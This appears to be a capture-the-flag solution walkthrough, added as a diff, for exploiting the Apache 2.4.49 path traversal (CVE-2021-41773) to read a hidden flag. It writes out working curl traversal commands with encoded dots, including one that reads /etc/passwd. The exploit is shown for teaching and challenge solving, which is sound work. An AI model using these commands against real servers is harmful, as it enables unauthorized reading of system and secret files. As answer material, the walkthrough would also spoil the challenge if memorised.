@@ -1,0 +1,129 @@
+Nothing To See Here - Solution Walkthrough
+==========================================
+
+This challenge presents what appears to be a plain corporate website with
+nothing of interest. The flag is hidden in a file that isn't served by the
+website at all — but a vulnerability in the web server itself lets you read
+any file on the system. This walkthrough explains how to find it.
+
+You need only a terminal with `curl` installed (or a web browser with
+developer tools). No programming knowledge is required.
+
+
+step 1: visit the website and look at what is there
+-----------------------------------------------------
+Open http://<host>:8080/ in a browser or run:
+
+    curl http://<host>:8080/
+
+You will see a generic corporate website: home, about, services, contact pages.
+There is nothing obviously interesting. Check some common places:
+
+    curl http://<host>:8080/robots.txt
+    curl http://<host>:8080/.htaccess   # 403 — can't read .ht* files
+    curl http://<host>:8080/admin/      # 404 — doesn't exist
+
+None of these give you a flag. Dead ends are part of the process.
+
+
+step 2: look at the server banner
+-----------------------------------
+Every HTTP response includes a Server header. Run:
+
+    curl -I http://<host>:8080/
+
+Look at the Server line in the response headers:
+
+    Server: Apache/2.4.49 (Unix)
+
+The exact version number — 2.4.49 — is significant. Searching for
+"Apache 2.4.49 vulnerability" immediately surfaces:
+
+    CVE-2021-41773 — path traversal in Apache httpd 2.4.49
+
+This vulnerability was so severe (publicly exploited within days of disclosure)
+that it became one of the most widely known Apache security incidents in recent
+years.
+
+
+step 3: understand the vulnerability
+--------------------------------------
+Normally, when you request a URL like:
+
+    /cgi-bin/../../../etc/passwd
+
+Apache normalises the path (removes the `..` segments) and checks that the
+result stays inside the configured document root. If it would escape, Apache
+returns 403.
+
+In Apache 2.4.49, this normalisation is broken when dots are URL-encoded.
+The percent-encoding of `.` is `%2e`. So:
+
+    /cgi-bin/.%2e/...   is the same as   /cgi-bin/../...
+
+But Apache 2.4.49 only normalises literal dots, not percent-encoded ones.
+It resolves `.%2e` on the filesystem (where the OS sees it as `..`) without
+first stripping it from the path. The result is that the path escapes the
+document root before Apache checks whether it should be allowed.
+
+This only matters when the server is also configured to allow access to the
+filesystem root. This challenge has that configuration set.
+
+
+step 4: find what files to target
+-----------------------------------
+The flag is not under the web root (htdocs/) — it's one directory above it,
+at /usr/local/apache2/flag.txt. You don't need to know that in advance;
+reading /etc/passwd first is a classic way to confirm the traversal works:
+
+    curl --path-as-is "http://<host>:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
+
+The --path-as-is flag tells curl NOT to normalise the path before sending it
+(without it, curl would clean up the dots and you would get a 404).
+
+If you see the contents of /etc/passwd, the traversal is working.
+
+
+step 5: navigate to the flag
+------------------------------
+The flag file is one level above the Apache document root. The cgi-bin directory
+is also one level below the Apache root:
+
+    /usr/local/apache2/cgi-bin/   (the cgi-bin alias resolves here)
+    /usr/local/apache2/flag.txt   (the flag — one ../ up from cgi-bin)
+
+So the traversal is just one level:
+
+    curl --path-as-is "http://<host>:8080/cgi-bin/.%2e/flag.txt"
+
+The server returns the flag in the format CSEC{...}. Copy and submit it.
+
+
+step 6: what to submit
+------------------------
+The response body will be a single line:
+
+    CSEC{...}
+
+That is your flag.
+
+
+what just happened — the short version
+----------------------------------------
+Apache 2.4.49 had a bug in the function that normalises URL paths. When a
+path segment used percent-encoding for dots (`%2e` instead of `.`), the
+normalisation step skipped it, but the filesystem still resolved it as a real
+dot. This let a remote attacker construct a URL that appeared to stay within
+the server's document root but actually traversed out to anywhere on the
+filesystem that the Apache process could read.
+
+The vulnerability only applied if the server administrator had set
+`Require all granted` on the root filesystem directory — which is not the
+default setting, but was common enough that thousands of servers were
+exploited within 48 hours of public disclosure in October 2021. Apache shipped
+the fix in version 2.4.50 (released the same day the CVE was published).
+
+The URL-encoding trick (`%2e` for `.`) is the same class of technique that
+appeared in many early web vulnerabilities — it exploits the gap between how a
+server's security checks interpret a string and how the filesystem or OS
+resolves it.
